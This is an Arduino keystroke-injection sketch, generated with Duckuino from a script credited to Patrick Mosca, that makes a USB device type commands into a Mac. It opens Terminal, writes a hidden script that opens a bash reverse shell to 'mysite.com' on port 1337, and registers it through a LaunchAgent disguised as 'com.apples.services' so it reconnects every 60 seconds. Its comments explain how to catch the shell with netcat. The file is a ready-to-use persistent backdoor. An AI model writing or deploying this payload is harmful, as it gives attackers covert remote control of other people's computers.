/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Nurrl/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Patrick Mosca
  // A simple script for creating a persistent backdoor on OSX.
  // Change mysite.com to your domain name or IP address
  // Change 1337 to your port number
  // Catch the shell with 'nc -l -p 1337'
  // http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  Keyboard.print(F("terminal"));

  delay(500);
  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("mkdir ~/Library/.hidden"));

  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F("echo '#!/bin/bash"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("bash -i >& /dev/tcp/mysite.com/1337 0>&1"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("wait' > ~/Library/.hidden/connect.sh"));

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("chmod +x ~/Library/.hidden/connect.sh"));

  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F("mkdir ~/Library/LaunchAgents"));

  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F("echo '<plist version=\"1.0\">"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<dict>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<key>Label</key>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<string>com.apples.services</string>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<key>ProgramArguments</key>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<array>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<string>/bin/sh</string>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<string>'$HOME'/Library/.hidden/connect.sh</string>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("</array>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<key>RunAtLoad</key>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<true/>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<key>StartInterval</key>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<integer>60</integer>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<key>AbandonProcessGroup</key>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("<true/>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("</dict>"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("</plist>' > ~/Library/LaunchAgents/com.apples.services.plist"));

  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F("chmod 600 ~/Library/LaunchAgents/com.apples.services.plist"));

  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F("launchctl load ~/Library/LaunchAgents/com.apples.services.plist"));

  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press("q");
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
